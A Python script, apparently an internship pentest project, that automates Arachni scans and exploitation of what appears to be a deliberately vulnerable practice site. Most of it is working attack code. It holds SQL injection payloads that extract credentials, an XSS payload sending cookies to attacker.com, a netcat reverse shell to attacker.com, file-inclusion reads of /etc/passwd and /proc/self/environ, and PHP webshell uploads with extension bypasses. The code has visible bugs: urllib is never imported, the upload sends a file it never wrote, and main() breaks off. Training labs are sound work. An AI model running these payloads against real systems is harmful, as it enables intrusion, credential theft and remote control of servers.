#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PROYEK AKHIR : OTOMATISASI VULNERABILITY ASSESSMENT & PENETRATION TESTING (WEB ONLY)
Fokus pada pengujian keamanan aplikasi web menggunakan Arachni dan eksploitasi manual.
Disusun untuk memenuhi Tugas Modul 3 - Project-Based Internship Vinix7

Fitur:
- Scanning web terfokus pada daftar URL yang disediakan (menghemat waktu)
- Eksploitasi multi-teknik dengan bypass: encoding, komentar, tag alternatif, wrapper, dll.
- Laporan komprehensif (Teks, JSON, HTML) dengan tabel dan rekomendasi
- Parallel exploitation untuk efisiensi waktu
- Penanganan error robust dan logging detail
- Menu interaktif untuk memilih mode eksekusi
"""

import os
import sys
import subprocess
import json
import time
import re
from datetime import datetime
from typing import Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== KONFIGURASI ====================
ARACHNI_BASE = os.path.expanduser("~/Downloads/arachni-1.6.1.3-0.6.1.1")
ARACHNI_PATH = f"{ARACHNI_BASE}/bin/arachni"
ARACHNI_REPORTER = f"{ARACHNI_BASE}/bin/arachni_reporter"
BASE_URL = "http://vulnweb.rootbrain.com"  # tanpa https karena beberapa mungkin http
DIR_LAPORAN = "laporan_akhir_web"
DIR_WEB = f"{DIR_LAPORAN}/web"
LOG_EKSPLOIT = f"{DIR_LAPORAN}/log_eksploitasi.txt"
REPORT_HTML = f"{DIR_LAPORAN}/laporan.html"

# Daftar URL yang akan dipindai (untuk mempercepat proses)
URL_LIST = [
    "http://vulnweb.rootbrain.com/",
    "http://vulnweb.rootbrain.com/CommandExecution/commandexec.html",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-1.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-1.php?username=Admin&password=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-2.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-2.php?typeBox=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-3.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-3.php?typeBox=",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-4.php",
    "http://vulnweb.rootbrain.com/CommandExecution/CommandExec-4.php?typeBox=",
    "http://vulnweb.rootbrain.com/SQL/sqlmainpage.html",
    "http://vulnweb.rootbrain.com/SQL/sql1.php",
    "http://vulnweb.rootbrain.com/SQL/sql1.php/",
    "http://vulnweb.rootbrain.com/SQL/sql2.php",
    "http://vulnweb.rootbrain.com/SQL/sql2.php/",
    "http://vulnweb.rootbrain.com/SQL/sql3.php",
    "http://vulnweb.rootbrain.com/SQL/sql3.php/",
    "http://vulnweb.rootbrain.com/SQL/sql4.php",
    "http://vulnweb.rootbrain.com/SQL/sql4.php/",
    "http://vulnweb.rootbrain.com/SQL/sql5.php/",
    "http://vulnweb.rootbrain.com/SQL/sql6.php",
    "http://vulnweb.rootbrain.com/SQL/sql6.php/",
    "http://vulnweb.rootbrain.com/SQL/sql6.php?number=",
    "http://vulnweb.rootbrain.com/XSS/xssmainpage.html",
    "http://vulnweb.rootbrain.com/XSS/xssmainpage.html/",
    "http://vulnweb.rootbrain.com/XSS/XSS_level1.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level1.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level2.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level2.php?username=%",
    "http://vulnweb.rootbrain.com/XSS/XSS_level3.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level3.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level4.php",
    "http://vulnweb.rootbrain.com/XSS/XSS_level4.php?username=",
    "http://vulnweb.rootbrain.com/XSS/XSS_level5.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/fileinc.html",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl1.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl1.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl2.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl2.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl3.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl3.php",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl4.php?file=",
    "http://vulnweb.rootbrain.com/FileInclusion/pages/lvl4.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupl.html",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload1.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload2.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload3.php",
    "http://vulnweb.rootbrain.com/FileUpload/fileupl.html/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload1.php/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload2.php/",
    "http://vulnweb.rootbrain.com/FileUpload/fileupload3.php/",
]

# Thread pool untuk eksploitasi paralel
MAX_WORKERS = 5

os.makedirs(DIR_WEB, exist_ok=True)

# ==================== FUNGSI BANTU ====================
def jalankan_perintah(perintah: str, tangkap: bool = True, timeout: int = 300) -> subprocess.CompletedProcess:
    print(f"[CMD] {perintah}")
    try:
        hasil = subprocess.run(
            perintah,
            shell=True,
            capture_output=tangkap,
            text=True,
            timeout=timeout
        )
        if tangkap and hasil.stdout:
            pratinjau = hasil.stdout[:200] + "..." if len(hasil.stdout) > 200 else hasil.stdout
            print(f"[OUT] {pratinjau}")
        return hasil
    except subprocess.TimeoutExpired:
        print(f"[ERROR] Perintah timeout setelah {timeout}s: {perintah}")
        return subprocess.CompletedProcess(args=perintah, returncode=124, stdout="", stderr="Timeout")
    except Exception as e:
        print(f"[ERROR] Gagal menjalankan perintah: {e}")
        return subprocess.CompletedProcess(args=perintah, returncode=1, stdout="", stderr=str(e))

def catat_log(pesan: str, level: str = "INFO") -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] [{level}] {pesan}")
    with open(f"{DIR_LAPORAN}/eksekusi.log", "a") as f:
        f.write(f"[{timestamp}] [{level}] {pesan}\n")

def catat_eksploit(pesan: str) -> None:
    with open(LOG_EKSPLOIT, "a") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {pesan}\n")

# ==================== BAGIAN 1: WEB VULNERABILITY (ARACHNI) ====================
def periksa_arachni() -> bool:
    if not os.path.exists(ARACHNI_PATH):
        catat_log(f"Arachni tidak ditemukan di {ARACHNI_PATH}!", "ERROR")
        return False
    hasil = jalankan_perintah(f"{ARACHNI_PATH} --version")
    if hasil.returncode != 0:
        catat_log("Eksekusi Arachni gagal.", "ERROR")
        return False
    catat_log(f"Arachni ditemukan: {hasil.stdout.strip()}")
    return True

def buat_file_restrict_paths() -> str:
    """Membuat file berisi path relatif untuk membatasi scan."""
    file_path = f"{DIR_WEB}/restrict_paths.txt"
    with open(file_path, 'w') as f:
        for url in URL_LIST:
            if url.startswith(BASE_URL):
                path = url[len(BASE_URL):]
                if not path.startswith('/'):
                    path = '/' + path
                f.write(path + '\n')
    catat_log(f"File restrict paths dibuat: {file_path}")
    return file_path

# Pilih salah satu
def jalankan_scan_arachni() -> Optional[str]:
    catat_log("Memulai scan web dengan Arachni  mode, restricted paths)...")
    file_afr = f"{DIR_WEB}/scan.afr"
    file_json = f"{DIR_WEB}/laporan.json"
    file_html_zip = f"{DIR_WEB}/laporan.html.zip"
    restrict_file = buat_file_restrict_paths()

    if os.path.exists(file_json):
        catat_log("Hasil scan sudah ada, melewati proses scan.")
        return file_json

    perintah = (
        f"{ARACHNI_PATH} "
        f"--output-verbose "
        f"--scope-restrict-paths {restrict_file} "
        f"--audit-links --audit-forms --audit-cookies --audit-headers "
        f"--audit-parameter-names --audit-with-extra-parameter "
        f"--audit-with-both-methods "
        f"--http-request-concurrency 20 "
        f"--checks=* "
        f"--browser-cluster-wait-for-timers "
        f"--browser-cluster-pool-size 4 "
        f"--report-save-path {file_afr} "
        f"--timeout 01:00:00 "
        f"{BASE_URL}"
    )
    hasil = jalankan_perintah(perintah, tangkap=False, timeout=3600)
    if hasil.returncode != 0:
        catat_log("Scan Arachni gagal.", "ERROR")
        return None

    catat_log("Mengonversi laporan ke JSON dan HTML...")
    hasil_json = jalankan_perintah(f"{ARACHNI_REPORTER} {file_afr} --reporter=json:outfile={file_json}", tangkap=True)
    if hasil_json.returncode != 0:
        catat_log(f"Gagal konversi ke JSON: {hasil_json.stderr}", "ERROR")
    else:
        catat_log("Konversi JSON berhasil.")
    hasil_html = jalankan_perintah(f"{ARACHNI_REPORTER} {file_afr} --reporter=html:outfile={file_html_zip}", tangkap=True)
    if hasil_html.returncode != 0:
        catat_log(f"Gagal konversi ke HTML: {hasil_html.stderr}", "ERROR")
    catat_log(f"Scan selesai. Laporan tersimpan di {DIR_WEB}")
    return file_json

def ekstrak_semua_isu(file_json: str) -> List[Dict]:
    """Mengembalikan semua isu dari laporan JSON, termasuk informational."""
    try:
        with open(file_json, 'r', encoding='utf-8') as f:
            data = json.load(f)
    except Exception as e:
        catat_log(f"Gagal membaca JSON: {e}", "ERROR")
        return []
    return data.get('issues', [])

def ekstrak_kerentanan_tinggi(file_json: str) -> List[Dict]:
    isu = ekstrak_semua_isu(file_json)
    hasil = []
    for i in isu:
        severity = i.get('severity', '').upper()
        if severity in ['HIGH', 'CRITICAL']:
            hasil.append({
                'nama': i.get('name'),
                'url': i.get('url'),
                'parameter': i.get('parameter', ''),
                'check': i.get('check', {}).get('name'),
                'severity': severity,
                'deskripsi': i.get('description', ''),
                'remediasi': i.get('remedy_guidance', ''),
                'cwe': i.get('cwe', ''),
                'cvss': i.get('cvss', 0)
            })
    catat_log(f"Ditemukan {len(hasil)} kerentanan High/Critical.")
    return hasil

# ==================== EKSPLOITASI DENGAN BYPASS ====================
def eksploit_sqli(url: str, param: str) -> Optional[Dict]:
    """SQL injection dengan teknik bypass (encoding, komentar, case variation)."""
    payloads = [
        # Union-based dengan komentar
        ("1' UNION SELECT NULL, version(), NULL--", "union_version"),
        ("1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--", "union_tables"),
        ("1' UNION SELECT NULL, concat(username,':',password), NULL FROM users--", "union_creds"),
        # Bypass dengan URL encoding
        ("1%27%20UNION%20SELECT%20NULL%2C%20version()%2C%20NULL--", "union_encoded"),
        # Bypass dengan komentar inline
        ("1'/*!UNION*/ SELECT NULL, version(), NULL--", "union_comment"),
        # Error-based dengan extractvalue
        ("1' AND extractvalue(1, concat(0x7e, database()))--", "error_db"),
        # Boolean-based blind
        ("1' AND '1'='1", "boolean_true"),
        ("1' AND '1'='2", "boolean_false"),
        # Time-based dengan sleep
        ("1' AND SLEEP(5)--", "time_5s"),
        ("1' AND BENCHMARK(5000000, MD5('test'))--", "time_benchmark"),
        # Bypass dengan case variation
        ("1' UnIoN SeLeCt NULL, version(), NULL--", "union_case"),
        # Menggunakan komentar untuk memotong query
        ("1' UNION SELECT NULL, version(), NULL /*", "union_comment_end"),
    ]
    for payload, teknik in payloads:
        url_uji = f"{url}?{param}={payload}"
        hasil = jalankan_perintah(f"curl -k -s -L --max-time 15 '{url_uji}'", timeout=20)
        if hasil.returncode != 0:
            continue
        # Deteksi keberhasilan
        if "mysql" in hasil.stdout.lower() or "version" in hasil.stdout.lower():
            catat_eksploit(f"[SQLi] {teknik} berhasil dengan payload: {payload}")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:500],
                'bypass': 'encoding/komentar'
            }
        elif "XPATH" in hasil.stdout:
            catat_eksploit(f"[SQLi] {teknik} (error-based) berhasil")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:500],
                'bypass': 'error-based'
            }
        elif teknik.startswith("time") and ("Timeout" in hasil.stderr or "timed out" in hasil.stderr):
            catat_eksploit(f"[SQLi] {teknik} terkonfirmasi (blind)")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': "Time-based blind terdeteksi",
                'bypass': 'time-based'
            }
    return None

def eksploit_xss(url: str, param: str) -> Optional[Dict]:
    """XSS dengan berbagai payload dan teknik bypass (event handler, tag alternatif, encoding)."""
    payloads = [
        ("<script>alert('XSS')</script>", "reflected_script"),
        ("<img src=x onerror=alert('XSS')>", "reflected_img"),
        ("\"><script>alert('XSS')</script>", "reflected_break"),
        ("<svg/onload=alert('XSS')>", "svg_onload"),
        ("<iframe src=\"javascript:alert('XSS')\">", "iframe_js"),
        ("<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>", "input_onfocus"),
        ("<math><mtext><a xlink:href=\"javascript:alert('XSS')\">click</a></mtext></math>", "math_xlink"),
        ("&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;", "html_encoded"),
        ("%253Cscript%253Ealert('XSS')%253C/script%253E", "double_encoded"),
        ("<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>", "stored_cookie"),
    ]
    for payload, teknik in payloads:
        url_uji = f"{url}?{param}={payload}"
        hasil = jalankan_perintah(f"curl -k -s -L '{url_uji}'", timeout=10)
        if payload in hasil.stdout or "alert('XSS')" in hasil.stdout or "onerror=alert" in hasil.stdout:
            catat_eksploit(f"[XSS] {teknik} berhasil di {url_uji}")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': "Payload tercermin dalam respons",
                'bypass': 'encoding/tag alternatif'
            }
    return None

def eksploit_command_injection(url: str, param: str) -> Optional[Dict]:
    """Command injection dengan berbagai pemisah perintah dan encoding."""
    payloads = [
        ("; id", "semicolon"),
        ("| id", "pipe"),
        ("$(id)", "subshell"),
        ("`id`", "backtick"),
        ("%3B id", "url_encoded_semicolon"),
        ("%0A id", "newline"),
        ("& id", "ampersand"),
        ("&& id", "and"),
        ("|| id", "or"),
        ("\nid", "newline_char"),
        (";`id`", "combined"),
        ("; nc -e /bin/sh attacker.com 4444", "reverse_shell"),
    ]
    for payload, teknik in payloads:
        url_uji = f"{url}?{param}={payload}"
        hasil = jalankan_perintah(f"curl -k -s -L '{url_uji}'", timeout=10)
        if "uid=" in hasil.stdout:
            catat_eksploit(f"[Command Injection] {teknik} berhasil")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:500],
                'bypass': 'encoding/pemisah alternatif'
            }
    return None

def eksploit_lfi(url: str, param: str) -> Optional[Dict]:
    """Local File Inclusion dengan berbagai teknik traversal dan wrapper."""
    payloads = [
        ("../../../../../../etc/passwd", "basic_traversal"),
        ("..\\..\\..\\..\\..\\windows\\win.ini", "windows_traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "double_encoded"),
        ("....//....//....//....//etc/passwd", "nested_dots"),
        ("php://filter/convert.base64-encode/resource=index.php", "php_wrapper"),
        ("php://filter/read=string.rot13/resource=index.php", "php_rot13"),
        ("../../../../../../etc/passwd%00", "null_byte"),
        ("/var/log/apache2/access.log", "log_poison"),
        ("/proc/self/environ", "proc_environ"),
    ]
    for payload, teknik in payloads:
        url_uji = f"{url}?{param}={payload}"
        hasil = jalankan_perintah(f"curl -k -s -L '{url_uji}'", timeout=10)
        if "root:x:0:0" in hasil.stdout:
            catat_eksploit(f"[LFI] {teknik} berhasil (etc/passwd)")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:500],
                'bypass': 'traversal/wrapper'
            }
        elif "[fonts]" in hasil.stdout:
            catat_eksploit(f"[LFI] {teknik} berhasil (win.ini)")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:500],
                'bypass': 'windows traversal'
            }
        elif re.match(r'^[A-Za-z0-9+/]+=*$', hasil.stdout.strip()):
            catat_eksploit(f"[LFI] {teknik} berhasil (base64)")
            return {
                'url': url_uji,
                'payload': payload,
                'teknik': teknik,
                'data_terekstrak': hasil.stdout[:200],
                'bypass': 'php wrapper'
            }
    return None

def eksploit_upload(url: str) -> Optional[Dict]:
    """File upload dengan teknik bypass ekstensi dan content-type."""
    hasil = jalankan_perintah(f"curl -k -s -L '{url}'", timeout=10)
    if 'enctype="multipart/form-data"' not in hasil.stdout and 'type="file"' not in hasil.stdout:
        return None

    catat_eksploit(f"[Upload] Formulir upload terdeteksi di {url}, mencoba upload webshell...")
    
    filenames = [
        "shell.php",
        "shell.php.jpg",
        "shell.php;.jpg",
        "shell.php%00.jpg",
        "shell.phtml",
        "shell.php3",
        "shell.php4",
        "shell.php5",
        "shell.php7",
        "shell.php.gif",
        "shell.jpg",
    ]
    
    webshells = [
        "<?php echo system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php system($_GET['cmd']); ?>",
        "GIF89a<?php system($_GET['cmd']); ?>",
    ]
    
    # Coba deteksi field name
    field_match = re.search(r'name="([^"]+)"\s+type="file"', hasil.stdout)
    if not field_match:
        return {
            'url': url,
            'teknik': 'deteksi',
            'data_terekstrak': 'Formulir upload terdeteksi, tetapi tidak dapat menentukan field name.',
            'bypass': 'N/A'
        }
    field = field_match.group(1)
    
    action_match = re.search(r'action="([^"]+)"', hasil.stdout)
    if action_match:
        action = action_match.group(1)
        if not action.startswith("http"):
            action = url.rstrip('/') + '/' + action.lstrip('/')
    else:
        action = url
    
    for fname in filenames:
        for shell in webshells:
            with open("/tmp/temp_shell", "w") as f:
                f.write(shell)
            upload_cmd = f"curl -k -s -F '{field}=@{fname};filename={fname}' {action}"
            upload_res = jalankan_perintah(upload_cmd, timeout=15)
            if upload_res.returncode == 0:
                base_path = url.rstrip('/').rsplit('/', 1)[0]
                shell_url = f"{base_path}/uploads/{fname}?cmd=id"
                verif = jalankan_perintah(f"curl -k -s '{shell_url}'", timeout=10)
                if "uid=" in verif.stdout:
                    catat_eksploit(f"[Upload] Webshell berhasil dieksekusi: {shell_url}")
                    return {
                        'url': url,
                        'teknik': 'upload_webshell',
                        'data_terekstrak': f"Webshell diupload ke {action}, dieksekusi di {shell_url}",
                        'bypass': 'ekstensi ganda/header GIF'
                    }
    return {
        'url': url,
        'teknik': 'deteksi',
        'data_terekstrak': 'Formulir upload terdeteksi, tetapi tidak ada upload yang berhasil.',
        'bypass': 'N/A'
    }

def lakukan_eksploitasi(daftar_kerentanan: List[Dict]) -> List[Dict]:
    hasil_eksploit = []
    futures = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for v in daftar_kerentanan:
            nama = v['nama'].lower()
            url = v['url']
            param = v.get('parameter', '')
            if 'sql' in nama or 'sqli' in nama:
                futures.append(executor.submit(eksploit_sqli, url, param))
            elif 'xss' in nama:
                futures.append(executor.submit(eksploit_xss, url, param))
            elif 'command' in nama or 'exec' in nama:
                futures.append(executor.submit(eksploit_command_injection, url, param))
            elif 'file inclusion' in nama or 'lfi' in nama:
                futures.append(executor.submit(eksploit_lfi, url, param))
            elif 'upload' in nama:
                futures.append(executor.submit(eksploit_upload, url))

        for future in as_completed(futures):
            try:
                res = future.result()
                if res:
                    hasil_eksploit.append(res)
                    catat_log(f"Eksploitasi berhasil: {res.get('teknik')} - {res.get('data_terekstrak', '')[:50]}", "SUCCESS")
            except Exception as e:
                catat_log(f"Eksploitasi error: {e}", "ERROR")

    return hasil_eksploit

# ==================== EKSPLOITASI MANUAL PADA SEMUA URL ====================
def manual_exploit_all_urls() -> List[Dict]:
    """Mencoba eksploitasi pada semua URL dalam daftar tanpa bergantung pada Arachni."""
    catat_log("Menjalankan eksploitasi manual pada semua URL...")
    hasil = []
    futures = []

    def process_url(url: str):
        # Parse parameter dari URL (jika ada query string)
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        # Jika tidak ada parameter, lewati (kecuali untuk upload)
        if not params:
            # Cek apakah ini halaman upload (berdasarkan path)
            if 'upload' in url.lower():
                res = eksploit_upload(url)
                if res:
                    return res
            return None

        # Untuk setiap parameter, coba berbagai eksploitasi
        for param in params.keys():
            # Coba SQLi
            res = eksploit_sqli(url.split('?')[0], param)
            if res:
                return res
            # Coba XSS
            res = eksploit_xss(url.split('?')[0], param)
            if res:
                return res
            # Coba Command Injection
            res = eksploit_command_injection(url.split('?')[0], param)
            if res:
                return res
            # Coba LFI
            res = eksploit_lfi(url.split('?')[0], param)
            if res:
                return res
        return None

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for url in URL_LIST:
            futures.append(executor.submit(process_url, url))

        for future in as_completed(futures):
            try:
                res = future.result()
                if res:
                    hasil.append(res)
                    catat_log(f"Manual exploit berhasil: {res.get('teknik')} - {res.get('data_terekstrak', '')[:50]}", "SUCCESS")
            except Exception as e:
                catat_log(f"Manual exploit error: {e}", "ERROR")

    catat_log(f"Eksploitasi manual selesai. {len(hasil)} eksploitasi berhasil.")
    return hasil

# ==================== BAGIAN 2: LAPORAN (HTML) ====================
def buat_laporan(semua_isu: List[Dict],
                        web_vulns: List[Dict],
                        hasil_eksploit: List[Dict]) -> None:
    """Membuat laporan HTML dengan tabel dan rekomendasi."""

    # Statistik
    web_crit = sum(1 for v in web_vulns if v['severity'] == 'CRITICAL')
    web_high = sum(1 for v in web_vulns if v['severity'] == 'HIGH')
    web_medium = sum(1 for v in web_vulns if v['severity'] == 'MEDIUM')
    web_low = sum(1 for v in web_vulns if v['severity'] == 'LOW')
    total_web = len(web_vulns)

    # Statistik semua isu
    total_isu = len(semua_isu)
    sev_count = {}
    for i in semua_isu:
        sev = i.get('severity', 'informational').upper()
        sev_count[sev] = sev_count.get(sev, 0) + 1

    # Buat HTML
    html = f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laporan Vulnerability Assessment (Web Only)</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
        h1, h2, h3 {{ color: #333; }}
        table {{ border-collapse: collapse; width: 100%; margin-bottom: 20px; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #4CAF50; color: white; }}
        .severity-critical, .severity-high {{ background-color: #ffcccc; }}
        .severity-medium {{ background-color: #ffff99; }}
        .severity-low {{ background-color: #e6f2ff; }}
        .severity-informational {{ background-color: #d3d3d3; }}
        .summary-box {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .box {{ background-color: #2196F3; color: white; padding: 20px; border-radius: 5px; width: 30%; text-align: center; }}
        .box.web {{ background-color: #4CAF50; }}
        .box.exploit {{ background-color: #ff9800; }}
        .footer {{ margin-top: 30px; font-size: 0.9em; color: #777; text-align: center; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>LAPORAN PENILAIAN KERENTANAN WEB</h1>
        <p><strong>Tanggal:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><strong>URL Target Web:</strong> {BASE_URL}</p>

        <div class="summary-box">
            <div class="box web">Kerentanan Web (High/Critical): {total_web}</div>
            <div class="box exploit">Eksploitasi Berhasil: {len(hasil_eksploit)}</div>
        </div>

        <h2>KEAMANAN APLIKASI WEB</h2>
        <h3>Ringkasan Severity (Semua Temuan)</h3>
        <ul>
"""
    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFORMATIONAL']:
        count = sev_count.get(sev, 0)
        html += f"<li>{sev}: {count}</li>\n"
    html += f"</ul><p>Total semua isu: {total_isu}</p>"

    html += """
        <h3>Semua Temuan Web</h3>
        <table>
            <tr><th>#</th><th>Nama Kerentanan</th><th>URL</th><th>Parameter</th><th>Severity</th><th>CWE</th></tr>
"""
    for idx, i in enumerate(semua_isu, 1):
        sev = i.get('severity', 'informational').lower()
        html += f"<tr class='severity-{sev}'><td>{idx}</td><td>{i.get('name','')}</td><td>{i.get('url','')}</td><td>{i.get('parameter','N/A')}</td><td>{i.get('severity','informational')}</td><td>{i.get('cwe','N/A')}</td></tr>"
    html += "</table>"

    html += """
        <h3>Daftar Kerentanan High/Critical</h3>
        <table>
            <tr><th>#</th><th>Nama Kerentanan</th><th>URL</th><th>Parameter</th><th>Severity</th><th>CWE</th></tr>
"""
    for idx, v in enumerate(web_vulns, 1):
        html += f"<tr class='severity-{v['severity'].lower()}'><td>{idx}</td><td>{v['nama']}</td><td>{v['url']}</td><td>{v.get('parameter', 'N/A')}</td><td>{v['severity']}</td><td>{v.get('cwe', 'N/A')}</td></tr>"
    html += "</table>"

    html += """
        <h3>Bukti Konsep (Proof of Concept) - Eksploitasi Berhasil</h3>
"""
    if hasil_eksploit:
        for p in hasil_eksploit:
            html += f"""
            <div style="background-color: #e8f5e8; padding: 10px; margin-bottom: 10px; border-left: 5px solid #4CAF50;">
                <strong>Teknik:</strong> {p.get('teknik', 'N/A')}<br>
                <strong>Bypass:</strong> {p.get('bypass', 'N/A')}<br>
                <strong>Payload:</strong> <code>{p.get('payload', 'N/A')}</code><br>
                <strong>URL:</strong> <a href="{p.get('url', '#')}" target="_blank">{p.get('url', '')}</a><br>
                <strong>Data Terekstrak:</strong> <pre>{p.get('data_terekstrak', '')}</pre>
            </div>
            """
    else:
        html += "<p>Tidak ada eksploitasi yang berhasil.</p>"

    html += f"""
        <h2>REKOMENDASI PERBAIKAN</h2>
        <ul>
            <li>Gunakan query terparameter untuk mencegah SQL Injection.</li>
            <li>Terapkan validasi input dan encoding output untuk mencegah XSS.</li>
            <li>Hindari penggunaan fungsi sistem yang tidak aman; gunakan API yang aman.</li>
            <li>Batasi akses file dan gunakan whitelist untuk LFI.</li>
            <li>Validasi tipe dan konten file upload; simpan di luar webroot.</li>
        </ul>

        <h2>DETAIL TEKNIS</h2>
        <p>Lokasi laporan: {DIR_LAPORAN}/</p>
        <p>Laporan web (HTML): ekstrak {DIR_WEB}/laporan.html.zip</p>
        <p>Log eksploitasi: {LOG_EKSPLOIT}</p>

        <div class="footer">
            Laporan dihasilkan secara otomatis oleh Assessment Tool (Web Only)<br>
            &copy; 2025 - Project-Based Internship Vinix7
        </div>
    </div>
</body>
</html>
"""

    with open(REPORT_HTML, 'w', encoding='utf-8') as f:
        f.write(html)

    # Juga simpan teks dan JSON
    with open(f"{DIR_LAPORAN}/laporan_akhir.txt", 'w', encoding='utf-8') as f:
        f.write(html)

    json_laporan = {
        'waktu': datetime.now().isoformat(),
        'semua_isu_web': semua_isu,
        'kerentanan_web_tinggi': web_vulns,
        'eksploit_berhasil': hasil_eksploit
    }
    with open(f"{DIR_LAPORAN}/laporan_akhir.json", 'w', encoding='utf-8') as f:
        json.dump(json_laporan, f, indent=2, default=str)

    catat_log(f"Laporan HTML tersimpan di {REPORT_HTML}")
    print("\n" + "="*60)
    print("RINGKASAN LAPORAN (WEB ONLY):")
    print(f"  Semua temuan web: {len(semua_isu)}")
    print(f"  Kerentanan Web High/Critical: {len(web_vulns)}")
    print(f"  Eksploitasi Berhasil: {len(hasil_eksploit)}")
    print(f"  Laporan HTML: {REPORT_HTML}")
    print("="*60)

# ==================== MENU INTERAKTIF ====================
def tampilkan_menu():
    print("\n" + "="*60)
    print("   VULNERABILITY ASSESSMENT TOOL (WEB ONLY)")
    print("="*60)
    print("Pilih mode eksekusi:")
    print("1. Scan dengan Arachni saja (menghasilkan laporan)")
    print("2. Eksploitasi manual pada semua URL (tanpa scan Arachni)")
    print("3. Scan Arachni + Eksploitasi manual (jika ada kerentanan high/critical)")
    print("4. Keluar")
    pilihan = input("Masukkan pilihan [1-4]: ").strip()
    return pilihan

def run_arachni_only():
    """Menjalankan scan Arachni dan membuat laporan."""
    catat_log("=== MODE: SCAN ARACHNI SAJA ===")
    if not periksa_arachni():
        return None, None, None
    laporan_json = jalankan_scan_arachni()
    if not laporan_json:
        catat_log("Scan Arachni gagal.", "ERROR")
        return None, None, None
    semua_isu = ekstrak_semua_isu(laporan_json)
    web_vulns = ekstrak_kerentanan_tinggi(laporan_json)
    return semua_isu, web_vulns, []

def run_exploit_only():
    """Menjalankan eksploitasi manual pada semua URL dan membuat laporan."""
    catat_log("=== MODE: EKSPLOITASI MANUAL SAJA ===")
    # Tidak ada data dari Arachni, jadi semua_isu dan web_vulns kosong
    semua_isu = []
    web_vulns = []
    hasil_eksploit = manual_exploit_all_urls()
    return semua_isu, web_vulns, hasil_eksploit

def run_both():
    """Menjalankan scan Arachni, lalu eksploitasi manual jika ada kerentanan tinggi."""
    catat_log("=== MODE: SCAN ARACHNI + EKSPLOITASI ===")
    if not periksa_arachni():
        return None, None, None
    laporan_json = jalankan_scan_arachni()
    if not laporan_json:
        catat_log("Scan Arachni gagal.", "ERROR")
        return None, None, None
    semua_isu = ekstrak_semua_isu(laporan_json)
    web_vulns = ekstrak_kerentanan_tinggi(laporan_json)
    if web_vulns:
        catat_log("Menjalankan eksploitasi pada kerentanan tinggi...")
        hasil_eksploit = lakukan_eksploitasi(web_vulns)
    else:
        catat_log("Tidak ada kerentanan tinggi, melewati eksploitasi.")
        hasil_eksploit = []
    return semua_isu, web_vulns, hasil_eksploit

# ==================== EKSEKUSI UTAMA ====================
def main():
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║           LEVEL VULNERABILITY ASSESSMENT & PENTEST       ║
    ║                    (WEB ONLY VERSION)                    ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    while True:
        pilihan = tampilkan_menu()
        if pilihan == '4':
            print("Keluar dari program.")
            break

        waktu_mulai = time.time()
